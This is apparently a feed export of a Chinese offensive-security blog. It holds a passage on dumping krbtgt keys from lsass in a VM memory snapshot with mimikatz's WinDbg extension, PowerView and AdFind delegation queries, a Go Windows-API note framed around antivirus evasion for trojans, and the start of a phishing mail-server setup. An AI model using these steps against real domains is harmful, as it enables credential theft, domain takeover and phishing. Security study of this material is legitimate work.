class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vmss2core.exe -W VM-Snapshot1.vmsn VM-Snapshot1.vmem</span><br></pre></td></tr></table></figure><p>如果是Linux系统的快照</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vmss2core-Linux64 -N virtual_machine_name.vmss</span><br></pre></td></tr></table></figure><p>接着需要下载WinDbg，Windows Store就能下载，然后载入提取的内存</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/Windows/49.png" alt="image-20211224133438904"></p><p>接着windbg控制台中运行.symfix，然后执行.reload</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>: kd&gt; .symfix</span><br><span class="line"><span class="number">0</span>: kd&gt; .reload</span><br><span class="line">Loading Kernel Symbols</span><br><span class="line">...............................................................</span><br><span class="line">................................................................</span><br><span class="line">............................</span><br><span class="line">Loading User Symbols</span><br><span class="line">Loading unloaded module list</span><br><span class="line">..................................................</span><br></pre></td></tr></table></figure><p><strong>windbg中载入mimilib模块</strong></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>: kd&gt; .load C:\Users\ascotbe\Desktop\mimilib_x64.dll</span><br><span class="line"></span><br><span class="line">  .<span class="comment">#####.   mimikatz 2.2.0 (x64) built on Aug 10 2021 02:01:09</span></span><br><span class="line"> .<span class="comment">## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - Windows build 14393</span></span><br><span class="line"> <span class="comment">## / \ ##  /* * *</span></span><br><span class="line"> <span class="comment">## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span></span><br><span class="line"> <span class="string">&#x27;## v ##&#x27;</span>   https://blog.gentilkiwi.com/mimikatz             (oe.eo)</span><br><span class="line">  <span class="string">&#x27;#####&#x27;</span>                                  WinDBG extension ! * * */</span><br><span class="line"></span><br><span class="line">===================================</span><br><span class="line"><span class="comment">#         * Kernel mode *         #</span></span><br><span class="line">===================================</span><br><span class="line"><span class="comment"># Search for LSASS process</span></span><br><span class="line"><span class="number">0</span>: kd&gt; !<span class="keyword">process</span> <span class="number">0</span> <span class="number">0</span> lsass.exe</span><br><span class="line"><span class="comment"># Then switch to its context</span></span><br><span class="line"><span class="number">0</span>: kd&gt; .process /<span class="built_in">r</span> /p &lt;EPROCESS address&gt;</span><br><span class="line"><span class="comment"># And finally :</span></span><br><span class="line"><span class="number">0</span>: kd&gt; !mimikatz</span><br><span class="line">===================================</span><br><span class="line"><span class="comment">#          * User mode *          #</span></span><br><span class="line">===================================</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; !mimikatz</span><br><span class="line">===================================</span><br></pre></td></tr></table></figure><p><strong>查找lsass进程</strong></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>: kd&gt; !<span class="keyword">process</span> <span class="number">0</span> <span class="number">0</span> lsass.exe</span><br><span class="line"><span class="keyword">PROCESS</span> ffffba0ecc9e6080</span><br><span class="line">    SessionId: <span class="number">0</span>  Cid: <span class="number">0374</span>    Peb: a06aad4000  ParentCid: <span class="number">02</span>f0</span><br><span class="line">    DirBase: <span class="number">20</span>a1b6000  ObjectTable: ffffcb05b2b93040  HandleCount: &lt;<span class="keyword">Data</span> Not Accessible&gt;</span><br><span class="line">    Image: lsass.exe</span><br></pre></td></tr></table></figure><p><strong>将镜像lsass环境转换到本机中</strong></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>: kd&gt; .process /<span class="built_in">r</span> /p ffffba0ecc9e6080</span><br><span class="line">Implicit <span class="keyword">process</span> is now ffffba0e`cc9e6080</span><br><span class="line">Loading User Symbols</span><br><span class="line">................................................................</span><br><span class="line">........................................................</span><br></pre></td></tr></table></figure><p><strong>载入mimikatz</strong></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>: kd&gt; !mimikatz</span><br><span class="line"></span><br><span class="line">krbtgt keys</span><br><span class="line">===========</span><br><span class="line"></span><br><span class="line">Current krbtgt: <span class="number">5</span> credentials</span><br><span class="line"> * rc4_hmac_nt       : XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span><br><span class="line"> * rc4_hmac_old      : XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span><br><span class="line"> * rc4_md4           : XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span><br><span class="line"> * aes256_hmac       : XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span><br><span class="line"> * aes128_hmac       : XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span><br><span class="line"><span class="comment">#此处内容省略</span></span><br></pre></td></tr></table></figure><p>获取完这个数据就能伪造白银票据，然后就可以获取所有管理员账户了</p><h2 id="关于委派"><a href="#关于委派" class="headerlink" title="关于委派"></a>关于委派</h2><h3 id="查询方式"><a href="#查询方式" class="headerlink" title="查询方式"></a>查询方式</h3><h4 id="查找非约束委派的主机或服务账号"><a href="#查找非约束委派的主机或服务账号" class="headerlink" title="查找非约束委派的主机或服务账号"></a>查找非约束委派的主机或服务账号</h4><h5 id="利用powerview"><a href="#利用powerview" class="headerlink" title="利用powerview"></a>利用powerview</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> .\PowerView.ps1;</span><br><span class="line"><span class="comment">#查询非约束委派的主机 </span></span><br><span class="line"><span class="built_in">Get-NetComputer</span> <span class="literal">-Unconstrained</span> <span class="literal">-Domain</span> ascotbe.com</span><br><span class="line"><span class="comment">#查询非约束委派的服务账号 </span></span><br><span class="line"><span class="built_in">Get-NetUser</span> <span class="literal">-Unconstrained</span> <span class="literal">-Domain</span> ascotbe.com | <span class="built_in">select</span> name</span><br></pre></td></tr></table></figure><h5 id="利用-ADFind"><a href="#利用-ADFind" class="headerlink" title="利用 ADFind"></a>利用 ADFind</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#查找域中配置非约束委派的用户 </span></span><br><span class="line">AdFind.exe <span class="literal">-b</span> <span class="string">&quot;DC=ascotbe,DC=com&quot;</span> <span class="operator">-f</span> <span class="string">&quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot;</span> cn distinguishedName</span><br><span class="line"><span class="comment">#查找域中配置非约束委派的主机 </span></span><br><span class="line">AdFind.exe <span class="literal">-b</span> <span class="string">&quot;DC=ascotbe,DC=com&quot;</span> <span class="operator">-f</span> <span class="string">&quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot;</span> cn distinguishedName</span><br></pre></td></tr></table></figure><h4 id="查找约束委派的主机或服务账号"><a href="#查找约束委派的主机或服务账号" class="headerlink" title="查找约束委派的主机或服务账号"></a>查找约束委派的主机或服务账号</h4><h5 id="利用powerview-1"><a href="#利用powerview-1" class="headerlink" title="利用powerview"></a>利用powerview</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> .\powerview.ps1;</span><br><span class="line"><span class="comment">#查询约束委派的主机：</span></span><br><span class="line"><span class="built_in">Get-DomainComputer</span> <span class="literal">-TrustedToAuth</span> <span class="literal">-Domain</span> ascotbe.com | <span class="built_in">select</span> name</span><br><span class="line"><span class="comment">#查询约束委派的账号： </span></span><br><span class="line"><span class="built_in">Get-DomainUser</span> <span class="literal">-TrustedToAuth</span> <span class="literal">-Domain</span> ascotbe.com | <span class="built_in">select</span> name</span><br></pre></td></tr></table></figure><h5 id="利用-ADFind-1"><a href="#利用-ADFind-1" class="headerlink" title="利用 ADFind"></a>利用 ADFind</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#查找域中配置约束委派用户: </span></span><br><span class="line">AdFind.exe <span class="literal">-b</span> <span class="string">&quot;DC=ascotbe,DC=com&quot;</span> <span class="operator">-f</span> <span class="string">&quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot;</span> cn distinguishedName msds<span class="literal">-allowedtodelegateto</span></span><br><span class="line"><span class="comment">#查找域中配置约束委派的主机： </span></span><br><span class="line">AdFind.exe <span class="literal">-b</span> <span class="string">&quot;DC=ascotbe,DC=com&quot;</span> <span class="operator">-f</span> <span class="string">&quot;(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&quot;</span> cn distinguishedName msds<span class="literal">-allowedtodelegateto</span></span><br></pre></td></tr></table></figure><h3 id="非约束委派"><a href="#非约束委派" class="headerlink" title="非约束委派"></a>非约束委派</h3><div class="note success modern"><p>通俗来说：如果攻击者拿到了一台配置了非约束委派的机器权限，可以诱导管理员来访问该机器，然后可以得到管理员的 TGT，从而模拟管理员访问任意服务，相当于拿下了整个域环境。</p></div><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://seevae.github.io/2020/09/12/%E8%AF%A6%E8%A7%A3kerberos%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B/</span><br><span class="line">http://www.cdsy.xyz/e/wap/show.php?classid=93&amp;id=4423&amp;style=0&amp;bclassid=68&amp;cid=93&amp;cpage=3</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Go使用WindowsApi笔记</title>
    <link href="https://www.ascotbe.com/2021/09/04/GoUseWindowsApi/"/>
    <id>https://www.ascotbe.com/2021/09/04/GoUseWindowsApi/</id>
    <published>2021-09-04T12:02:59.000Z</published>
    <updated>2022-01-10T03:06:02.000Z</updated>
    
    <content type="html"><![CDATA[<div class="note danger modern"><p>郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</p></div><blockquote><p>前言</p></blockquote><p>在学Go相关的免杀，来提高木马的存活性，看到一些有意思的东西记下来</p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/GoUseWindowsApi/1.gif" alt="1" style="zoom:50%;" /><h3 id="加载DLL"><a href="#加载DLL" class="headerlink" title="加载DLL"></a>加载DLL</h3><p>要在Go中加载DLL，可以使用<code>syscall.NewLazyDLL</code>或<code>syscall.LoadLibrary</code> 以及<code>syscall.MustLoadDLL</code>。</p><ul><li><code>NewLazyDLL</code>返回一个<code>*LazyDLL</code>，懒加载，只在第一次调用其函数时才加载库;</li><li><code>LoadLibrary</code>是立即加载DLL库。</li></ul><h3 id="创建函数"><a href="#创建函数" class="headerlink" title="创建函数"></a>创建函数</h3><blockquote><p>syscall.NewLazyDLL</p></blockquote><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;syscall&quot;</span></span><br><span class="line"><span class="string">&quot;unsafe&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">user32 := syscall.NewLazyDLL(<span class="string">&quot;user32.dll&quot;</span>)</span><br><span class="line">MessageBoxW := user32.NewProc(<span class="string">&quot;MessageBoxW&quot;</span>)</span><br><span class="line">MessageBoxW.Call(<span class="type">uintptr</span>(<span class="number">0</span>), <span class="type">uintptr</span>(unsafe.Pointer(syscall.StringToUTF16Ptr(<span class="string">&quot;windows下的第一种调用方式&quot;</span>))), <span class="type">uintptr</span>(unsafe.Pointer(syscall.StringToUTF16Ptr(<span class="string">&quot;ascotbe&quot;</span>))), <span class="type">uintptr</span>(<span class="number">0</span>))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>syscall.LoadLibrary</p></blockquote><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;syscall&quot;</span></span><br><span class="line"><span class="string">&quot;unsafe&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">MB_YESNOCANCEL = <span class="number">0x00000003</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">user32, _ := syscall.LoadLibrary(<span class="string">&quot;user32.dll&quot;</span>)</span><br><span class="line">messageBox, _ := syscall.GetProcAddress(user32, <span class="string">&quot;MessageBoxW&quot;</span>)</span><br><span class="line">_, _, callErr := syscall.Syscall9(messageBox,</span><br><span class="line"><span class="number">4</span>,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line"><span class="type">uintptr</span>(unsafe.Pointer(syscall.StringToUTF16Ptr(<span class="string">&quot;第二种调用方式&quot;</span>))),</span><br><span class="line"><span class="type">uintptr</span>(unsafe.Pointer(syscall.StringToUTF16Ptr(<span class="string">&quot;ascotbe&quot;</span>))),</span><br><span class="line">MB_YESNOCANCEL,</span><br><span class="line"><span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line"><span class="keyword">if</span> callErr != <span class="number">0</span> &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>syscall.MustLoadDLL</p></blockquote><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;syscall&quot;</span></span><br><span class="line"><span class="string">&quot;unsafe&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">MB_YESNOCANCEL = <span class="number">0x00000003</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">user32      = syscall.MustLoadDLL(<span class="string">&quot;user32.dll&quot;</span>)</span><br><span class="line">MessageBoxW = user32.MustFindProc(<span class="string">&quot;MessageBoxW&quot;</span>)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"></span><br><span class="line">_, _, eeee := MessageBoxW.Call(<span class="number">0</span>,</span><br><span class="line"><span class="type">uintptr</span>(unsafe.Pointer(syscall.StringToUTF16Ptr(<span class="string">&quot;第三种调用方式&quot;</span>))),</span><br><span class="line"><span class="type">uintptr</span>(unsafe.Pointer(syscall.StringToUTF16Ptr(<span class="string">&quot;ascotbe&quot;</span>))),</span><br><span class="line">MB_YESNOCANCEL)</span><br><span class="line"><span class="keyword">if</span> eeee != <span class="literal">nil</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不管调用哪个API，<code>Call</code>的模式都是一样的。</p><p>而且<code>syscall.Syscall</code>函数始终返回<code>r1,r2 uintptr,err error</code>， 就最近的实践(windows_amd64)来看，基本可以确定:</p><ul><li>r1 始终返回 <code>syscall</code>的值；</li><li>r2 暂且使用；</li><li>err 返回调用Windows API<code>GetLastError</code>的结果，这是<code>syscall</code>自动调用的。</li></ul><p>而你传入<code>Call</code>中的值必须全部是<code>uintptr</code>，不管你原来的类型是什么</p><h3 id="API函数签名"><a href="#API函数签名" class="headerlink" title="API函数签名"></a>API函数签名</h3><p>在实际调用DLL函数之前，我们必须要了解一下过程所需要的参数，类型，大小。Microsoft将此描述为Windows API文档的一部分。如<code>CreateJobObjectA</code>的过程签名如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HANDLE CreateJobObjectA(</span><br><span class="line">  LPSECURITY_ATTRIBUTES lpJobAttributes,</span><br><span class="line">  LPCSTR                lpName</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>也就是说，<code>CreateJobObjectA</code>需要一个指向<code>LPSECURITY_ATTRIBUTES</code>结构的指针，和一个指向C-String的指针（ASCII编码，技术上是<a href="https://en.wikipedia.org/wiki/Windows-1252">Windows-1252编码</a> ;它与ASCII兼容）。</p><h3 id="C结构与Go结构"><a href="#C结构与Go结构" class="headerlink" title="C结构与Go结构"></a>C结构与Go结构</h3><p>在文档中我们可以搜索到，<code>LPSECURITY_ATTRIBUTES</code>是这么定义的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _SECURITY_ATTRIBUTES &#123;</span><br><span class="line">  DWORD  nLength;</span><br><span class="line">  LPVOID lpSecurityDescriptor;</span><br><span class="line">  BOOL   bInheritHandle;</span><br><span class="line">&#125; SECURITY_ATTRIBUTES, *PSECURITY_ATTRIBUTES, *LPSECURITY_ATTRIBUTES;</span><br></pre></td></tr></table></figure><p>这时，我们就必须构造一个类似的Go结构来替代它。这时我们可以参考<code>syscall</code>中<a href="https://godoc.org/golang.org/x/sys/windows#SecurityAttributes">SecurityAttributes</a>的定义。</p><p>在Windows API中，我们可以看到，<code>SecurityAttributes</code>是这么定义的：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_SECURITY_ATTRIBUTES</span> &#123;</span><br><span class="line">  DWORD  nLength;</span><br><span class="line">  LPVOID lpSecurityDescriptor;</span><br><span class="line">  BOOL   bInheritHandle;</span><br><span class="line">&#125; SECURITY_ATTRIBUTES, *PSECURITY_ATTRIBUTES, *LPSECURITY_ATTRIBUTES;</span><br></pre></td></tr></table></figure><p>而Go中<a href="https://godoc.org/golang.org/x/sys/windows#SecurityAttributes">SecurityAttributes</a>的定义为：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> SecurityAttributes <span class="keyword">struct</span> &#123;</span><br><span class="line">    Length             <span class="type">uint32</span></span><br><span class="line">    SecurityDescriptor <span class="type">uintptr</span></span><br><span class="line">    InheritHandle      <span class="type">uint32</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由此我们大概知道， <code>DWORD</code>对应Go <code>uint32</code>， <code>LPVOID (* void)</code>对应<code>uintptr</code>，<code>BOOL</code>对应<code>uint32</code>。所以在你不知道用什么类型来表示C中对应的结构时，你可以去看看<code>syscall</code>或<code>go.sys</code>库中找找，或许能有收获。Windows一些参考类型<a href="https://docs.microsoft.com/en-us/windows/desktop/WinProg/windows-data-types">这里</a>也有描述。</p><p>然而，了解下面这些常见C类型与Go类型的对应关系会非常有用。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> (</span><br><span class="line">BOOL          <span class="type">uint32</span></span><br><span class="line">BOOLEAN       <span class="type">byte</span></span><br><span class="line">BYTE          <span class="type">byte</span></span><br><span class="line">DWORD         <span class="type">uint32</span></span><br><span class="line">DWORD64       <span class="type">uint64</span></span><br><span class="line">HANDLE        <span class="type">uintptr</span></span><br><span class="line">HLOCAL        <span class="type">uintptr</span></span><br><span class="line">LARGE_INTEGER <span class="type">int64</span></span><br><span class="line">LONG          <span class="type">int32</span></span><br><span class="line">LPVOID        <span class="type">uintptr</span></span><br><span class="line">SIZE_T        <span class="type">uintptr</span></span><br><span class="line">UINT          <span class="type">uint32</span></span><br><span class="line">ULONG_PTR     <span class="type">uintptr</span></span><br><span class="line">ULONGLONG     <span class="type">uint64</span></span><br><span class="line">WORD          <span class="type">uint16</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://razeencheng.com/post/breaking-all-the-rules-using-go-to-call-windows-api.html</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    
  </entry>
  
  <entry>
    <title>关于邮件钓鱼的哪些事(二)</title>
    <link href="https://www.ascotbe.com/2021/08/17/Office_0x02/"/>
    <id>https://www.ascotbe.com/2021/08/17/Office_0x02/</id>
    <published>2021-08-17T13:45:42.000Z</published>
    <updated>2022-01-10T03:06:02.000Z</updated>
    
    <content type="html"><![CDATA[<div class="note danger modern"><p>郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</p></div><blockquote><p>前言</p></blockquote><p>首先需要编写一个<a href="https://github.com/Ascotbe/Medusa">钓鱼一键化平台</a>，然后进入我们的正题</p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/Offer/39.png" alt="image-20210821112914140" style="zoom: 15%;" /><h2 id="搭建邮件服务器"><a href="#搭建邮件服务器" class="headerlink" title="搭建邮件服务器"></a>搭建邮件服务器</h2><h3 id="首先卸载Postfix"><a href="#首先卸载Postfix" class="headerlink" title="首先卸载Postfix"></a>首先卸载Postfix</h3><p>如果没有Postfix就跳过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl stop postfix</span><br><span class="line">sudo apt remove postfix &amp;&amp; apt purge postfix</span><br></pre></td></tr></table></figure><h3 id="安装Sendmail"><a href="#安装Sendmail" class="headerlink" title="安装Sendmail"></a>安装Sendmail</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install sendmail</span><br></pre></td></tr></table></figure><h3 id="配置Sendmail服务器"><a href="#配置Sendmail服务器" class="headerlink" title="配置Sendmail服务器"></a>配置Sendmail服务器</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo sendmailconfig</span><br></pre></td></tr></table></figure><h3 id="接收输入电子邮件"><a href="#接收输入电子邮件" class="headerlink" title="接收输入电子邮件"></a>接收输入电子邮件</h3><p>编辑<code>/etc/mail/sendmail.mc</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">DAEMON_OPTIONS(`Family=inet,  Name=MTA-v4, Port=smtp, Addr=127.0.0.1&#x27;)dnl</span><br><span class="line">DAEMON_OPTIONS(`Family=inet,  Name=MSP-v4, Port=submission, M=Ea, Addr=127.0.0.1&#x27;)dnl</span><br><span class="line"></span><br><span class="line">#找到上面这两行修改为</span><br><span class="line">DAEMON_OPTIONS(`Family=inet,  Name=MTA-v4, Port=smtp, Addr=0.0.0.0&#x27;)dnl</span><br><span class="line">dnl   DAEMON_OPTIONS(`Family=inet,  Name=MSP-v4, Port=submission, M=Ea, Addr=127.0.0.1&#x27;)dnl</span><br></pre></td></tr></table></figure><p>然后将域名添加到<code>/etc/mail/local-host-names</code>文件中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ascotbe.com</span><br><span class="line">mail.ascotbe.com</span><br><span class="line">localhost</span><br><span class="line">localhost.localdomain</span><br></pre></td></tr></table></figure><p>现在使用 m4宏处理器来编译Sendmail配置文件。m4是基于流的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo m4 /etc/mail/sendmail.mc &gt; /etc/mail/sendmail.cf</span><br></pre></td></tr></table></figure><p>重新启动Sendmail服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl restart sendmail</span><br></pre></td></tr></table></figure><h3 id="日志文件"><a href="#日志文件" class="headerlink" title="日志文件"></a>日志文件</h3><p>里面有一些报错，比方说为什么发送失败等等</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/log/mail.log</span><br></pre></td></tr></table></figure><h3 id="多服务方案"><a href="#多服务方案" class="headerlink" title="多服务方案"></a>多服务方案</h3><blockquote><p>最好是sendmail和medusa搭建在同一台服务器上</p><p>而不是使用多服务方案</p></blockquote><p>如果你的Medusa在一个服务器，而邮件服务器又在一个地方，需要修改邮件服务中的配置，打开<code>/etc/mail/access</code>文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#添加全局配置</span><br><span class="line">202.222 RELAY</span><br><span class="line">#或者添加单IP发送配置，这个IP为你Medusa的服务器IP</span><br><span class="line">192.111.111.111  RELAY</span><br></pre></td></tr></table></figure><p>配置完需要重启服务器</p><h3 id="配置域名解析"><a href="#配置域名解析" class="headerlink" title="配置域名解析"></a>配置域名解析</h3><p><img src= "/img/loading.gif" 